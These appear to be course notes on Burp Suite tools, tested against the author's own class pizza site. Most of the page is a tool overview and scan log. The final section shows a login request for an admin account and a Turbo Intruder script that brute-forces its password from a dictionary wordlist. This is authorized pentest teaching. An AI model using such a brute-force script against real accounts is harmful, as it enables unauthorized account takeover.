# Burp Suite

[Download](https://portswigger.net/burp/communitydownload)

Burp Suite is a software security application used for penetration testing of web applications. Both a free and a paid version of the software are available. The software is developed by the company PortSwigger.[1][2] The suite includes tools such as a proxy server (Burp Proxy), an indexing robot (Burp Spider), an intrusion tool (Burp Intruder), a vulnerability scanner (Burp Scanner) and an HTTP repeater (Burp Repeater)

> Wikipedia

- **Proxy**: Intercepts and inspects web traffic between the browser and the server.
- **Scanner**: Automatically scans web applications for vulnerabilities.
- **Intruder**: Performs automated attacks to identify vulnerabilities like SQL injection, cross-site scripting (XSS), and more.
- **Repeater**: Allows manual testing by replaying individual HTTP requests.
- **Sequencer**: Analyzes the randomness of session tokens.
- **Decoder**: Decodes and encodes data in various formats.
- **Comparer**: Compares HTTP responses.
- **Extender**: Allows the integration of third-party extensions to enhance functionality.

## Dastardly

A security DAST (Dynamic Application Security Testing) tool is a type of software used to analyze web applications for security vulnerabilities while they are running. Unlike static analysis tools, which examine source code, DAST tools test applications from the outside in, simulating the actions of an attacker to identify vulnerabilities in real-time.

Really easy scan in your GitHub action workflow.

```yml
steps:
  - name: Run Dastardly Action Step
    uses: PortSwigger/dastardly-github-action@main
    with:
      target-url: 'https://pizza.cs329.click'
```

```sh
    §§§§§§§§§§§§§§§§§§§§§§§§\
    §                      § |
    §          ||          § |
    §         //           § |    §§§§§§§\                        §§\                               §§\ §§\
    §        //            § |    §§  __§§\                       §§ |                              §§ |§§ |
    §      /////|          § |    §§ |  §§ | §§§§§§\   §§§§§§§\ §§§§§§\    §§§§§§\   §§§§§§\   §§§§§§§ |§§ |§§\   §§\
    §          ||          § |    §§ |  §§ | \____§§\ §§  _____|\_§§  _|   \____§§\ §§  __§§\ §§  __§§ |§§ |§§ |  §§ |
    §          |/////      § |    §§ |  §§ | §§§§§§§ |\§§§§§§\    §§ |     §§§§§§§ |§§ |  \__|§§ /  §§ |§§ |§§ |  §§ |
    §            //        § |    §§ |  §§ |§§  __§§ | \____§§\   §§ |§§\ §§  __§§ |§§ |      §§ |  §§ |§§ |§§ |  §§ |
    §           //         § |    §§§§§§§  |\§§§§§§§ |§§§§§§§  |  \§§§§  |\§§§§§§§ |§§ |      \§§§§§§§ |§§ |\§§§§§§§ |
    §          ||          § |    \_______/  \_______|\_______/    \____/  \_______|\__|       \_______|\__| \____§§ |
    §                      § |                                                                              §§\   §§ |
    §§§§§§§§§§§§§§§§§§§§§§§§ |                                           from Burp Suite v2024.5.1-17301    \§§§§§§  |
    \________________________|                                                                               \______/

Installing or running Dastardly affirms your agreement to the Terms of Service https://portswigger.net/burp/dastardly/eula

2024-06-14 22:45:07 INFO  dastardly.StartDastardly - Using Java version 21.0.3
2024-06-14 22:45:19 INFO  bsee.BurpProcess.scan.scan-1 - [Thread: 102] 2024-06-14 10:45:19.945 249172783174, net.portswigger.Zoe INFO - connectedSocket, opened new socket: 2013517612
2024-06-14 22:45:19 INFO  b.s.LoggingScanProgressCollector - 2024-06-14 22:45:15 INFORMATION - Running as super-user, browser sandbox is not supported
2024-06-14 22:45:19 INFO  b.s.LoggingScanProgressCollector - 2024-06-14 22:45:17 INFORMATION - Crawl started.
2024-06-14 22:45:19 INFO  b.s.LoggingScanProgressCollector - 2024-06-14 22:45:18 DEBUG - pizza.cs329.click is using HTTP/2
2024-06-14 22:45:24 INFO  bsee.BurpProcess.scan.scan-1 - 2024-06-14 10:45:24: CRAWLING -> crawlUniqueLocationsVisited:8, crawlRequestsMade:45, auditQueueItemsWaiting:0, auditQueueItemsCompleted:0, auditRequestsMade:0, insertionPointCount:0
2024-06-14 22:45:24 INFO  b.s.LoggingScanProgressCollector - 2024-06-14 22:45:20 DEBUG - pizza-service.cs329.click is using HTTP/2
2024-06-14 22:45:24 INFO  b.s.LoggingScanProgressCollector - 2024-06-14 22:45:24 DEBUG - images.unsplash.com is using HTTP/2
2024-06-14 22:46:50 INFO  bsee.BurpProcess.scan.scan-1 - 2024-06-14 10:46:50: Crawl finished
2024-06-14 22:46:50 INFO  bsee.BurpProcess.scan.scan-1 - 2024-06-14 10:46:50: Audit started
2024-06-14 22:46:54 INFO  bsee.BurpProcess.scan.scan-1 - 2024-06-14 10:46:54: AUDITING -> crawlUniqueLocationsVisited:23, crawlRequestsMade:548, auditQueueItemsWaiting:1, auditQueueItemsCompleted:5, auditRequestsMade:70, insertionPointCount:25
2024-06-14 22:46:54 INFO  b.s.LoggingScanProgressCollector - 2024-06-14 22:46:50 INFORMATION - Crawl finished.
2024-06-14 22:46:54 INFO  b.s.LoggingScanProgressCollector - 2024-06-14 22:46:50 INFORMATION - Audit started.
2024-06-14 22:46:54 INFO  b.s.IssueLoggingScanProgressCollector - Issue identified. Path: /robots.txt, Issue Type: Cross-origin resource sharing: arbitrary origin trusted, Severity: INFO
2024-06-14 22:46:54 INFO  b.s.IssueLoggingScanProgressCollector - Issue identified. Path: /robots.txt, Issue Type: Cross-origin resource sharing, Severity: INFO
2024-06-14 22:46:54 INFO  b.s.IssueLoggingScanProgressCollector - Issue identified. Path: /, Issue Type: Cross-origin resource sharing: arbitrary origin trusted, Severity: INFO
2024-06-14 22:46:54 INFO  b.s.IssueLoggingScanProgressCollector - Issue identified. Path: /, Issue Type: Cross-origin resource sharing, Severity: INFO
2024-06-14 22:46:54 INFO  b.s.IssueLoggingScanProgressCollector - Issue identified. Path: /assets/index-CRT3bSBQ.css, Issue Type: Cross-origin resource sharing: arbitrary origin trusted, Severity: INFO
2024-06-14 22:46:54 INFO  b.s.IssueLoggingScanProgressCollector - Issue identified. Path: /assets/index-CRT3bSBQ.css, Issue Type: Cross-origin resource sharing, Severity: INFO
2024-06-14 22:46:54 INFO  b.s.IssueLoggingScanProgressCollector - Issue identified. Path: /assets/index-BsFcYlwQ.js, Issue Type: Cross-origin resource sharing: arbitrary origin trusted, Severity: INFO
2024-06-14 22:46:54 INFO  b.s.IssueLoggingScanProgressCollector - Issue identified. Path: /assets/index-BsFcYlwQ.js, Issue Type: Cross-origin resource sharing, Severity: INFO
2024-06-14 22:46:54 INFO  b.s.IssueLoggingScanProgressCollector - Issue identified. Path: /jwt-pizza-icon.png, Issue Type: Cross-origin resource sharing: arbitrary origin trusted, Severity: INFO
2024-06-14 22:46:54 INFO  b.s.IssueLoggingScanProgressCollector - Issue identified. Path: /jwt-pizza-icon.png, Issue Type: Cross-origin resource sharing, Severity: INFO
2024-06-14 22:46:55 INFO  bsee.BurpProcess.scan.scan-1 - 2024-06-14 10:46:55: Audit finished
2024-06-14 22:46:59 INFO  bsee.BurpProcess.scan.scan-1 - 2024-06-14 10:46:59: SUCCEEDED -> crawlUniqueLocationsVisited:23, crawlRequestsMade:548, auditQueueItemsWaiting:0, auditQueueItemsCompleted:6, auditRequestsMade:70, insertionPointCount:25
2024-06-14 22:46:59 INFO  b.s.LoggingScanProgressCollector - Event log updated:
2024-06-14 22:46:59 INFO  b.s.LoggingScanProgressCollector - 2024-06-14 22:46:55 INFORMATION - Audit finished.
2024-06-14 22:46:59 INFO  b.s.IssueLoggingScanProgressCollector - Issue identified. Path: /version.json, Issue Type: Cross-origin resource sharing: arbitrary origin trusted, Severity: INFO
2024-06-14 22:46:59 INFO  b.s.IssueLoggingScanProgressCollector - Issue identified. Path: /version.json, Issue Type: Cross-origin resource sharing, Severity: INFO
2024-06-14 22:46:59 INFO  bsee.BurpProcess.scan.scan-1 - Received metric SUCCEEDED 70 23
2024-06-14 22:46:59 INFO  b.s.LoggingScanProgressCollector - Scan has completed successfully
```

## Sequencer

Get a request with a token or cookie in it. Use the sequencer to run the request a bunch of times and see if there is any sort of randomness to the token.

![alt text](sequencerToken.png)

![alt text](sequencerResults.png)

Note that this made thousands of requests. This can impact your AWS bill.

![alt text](sequencerCloudWatchMetrics.png)

## Comparer

This allows you to take any number o

![alt text](comparerResponse.png)

## Turbo Intruder

I couldn't get the standard intruder to work and so I used this extension. It is pretty fast.

https://www.youtube.com/watch?v=UMaZc3yV2Oo

![Use turbo intruder](useTurboIntruder.png)

Insert the parameter variable `%s`

```
PUT /api/auth HTTP/2
Host: pizza-service.cs329.click
Content-Length: 40
Sec-Ch-Ua: "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Platform: "macOS"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://pizza.cs329.click
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://pizza.cs329.click/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

{"email":"admin@jwt.com","password":"%s"}
```

```py
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )
#
#    engine.queue(target.req, 'admin')
#    engine.queue(target.req, 'a')

    for i in range(3, 8):
        engine.queue(target.req, randstr(i), learn=1)
        engine.queue(target.req, target.baseInput, learn=2)

    for word in open('/usr/share/dict/words'):
        engine.queue(target.req, word.rstrip())


def handleResponse(req, interesting):
    if '200 OK' in req.response:
        table.add(req)
```
